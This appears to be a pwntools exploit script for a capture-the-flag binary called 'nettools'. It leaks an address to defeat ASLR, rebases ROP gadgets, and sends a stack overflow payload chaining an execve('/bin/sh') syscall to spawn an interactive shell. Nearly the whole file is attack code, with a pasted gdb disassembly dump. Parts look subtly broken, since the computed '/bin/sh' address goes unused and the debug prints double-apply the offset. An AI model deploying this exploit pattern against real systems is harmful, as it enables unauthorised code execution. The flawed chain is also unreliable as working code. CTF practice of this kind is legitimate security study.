from pwn import *

# io = process('./nettools')
io = gdb.debug('./nettools', """
    start
    b *nettools::ip_lookup+1029
""")

context.binary = './nettools'

choice = 0x7a03c
pop_rax_ret = 0x000000000000ecaa
pop_rdi_ret = 0x000000000000a0ef
pop_rsi_syscall = 0x0000000000025ade
ret = 0x000000000000901a
binsh = 0x6010e
sh = 0x8d9a8

io.recvuntil(b'Opss! Something is leaked:')
leak_addr = int(io.recvline(), 16)

pop_rax_ret += leak_addr - choice
pop_rdi_ret += leak_addr - choice
pop_rsi_syscall += leak_addr - choice
ret += leak_addr - choice
# strings --radix=x nettools  | grep /bin/sh
binsh += leak_addr - choice
sh += leak_addr - choice

print(hex(leak_addr))
print(hex(leak_addr - choice + pop_rax_ret))
print(hex(leak_addr - choice + pop_rdi_ret))
print(hex(leak_addr - choice + pop_rsi_syscall))


"""
->   0x55fbf979803c <_ZN8nettools6CHOICE17h0d0daa1684b4400fE>:    add    eax,DWORD PTR [rax]
   0x55fbf979803e <_ZN8nettools6CHOICE17h0d0daa1684b4400fE+2>:  add    BYTE PTR [rax],al
   0x55fbf9798040 <__rust_alloc_error_handler_should_panic>:    add    BYTE PTR [rax],al
   0x55fbf9798042:      add    BYTE PTR [rax],al
   0x55fbf9798044 <_ZN3std2rt7cleanup7CLEANUP17h5050a45c6957db6aE>:     add    BYTE PTR [rax],al
   0x55fbf9798046 <_ZN3std2rt7cleanup7CLEANUP17h5050a45c6957db6aE+2>:   add    BYTE PTR [rax],al
   0x55fbf9798048 <_ZN3std2io5stdio19OUTPUT_CAPTURE_USED17h7b682121806bb745E.0>:        add    BYTE PTR [rax],al
   0x55fbf979804a:      add    BYTE PTR [rax],al
   0x55fbf979804c:      add    BYTE PTR [rax],al
   0x55fbf979804e:      add    BYTE PTR [rax],al
"""


offset = 344
payload = b'A' * 399 + b'\x00' + b'B' * offset
payload += pack(ret)
payload += pack(pop_rax_ret)
payload += pack(59)
payload += pack(pop_rdi_ret)
payload += b'/bin/sh\x00'
payload += pack(pop_rsi_syscall)
payload += pack(0)

io.sendline(b'3')
io.sendline(payload)

# io.sendline(b'3')
# io.sendline(b'A' * 401 + b'\x00' + patt)

io.interactive()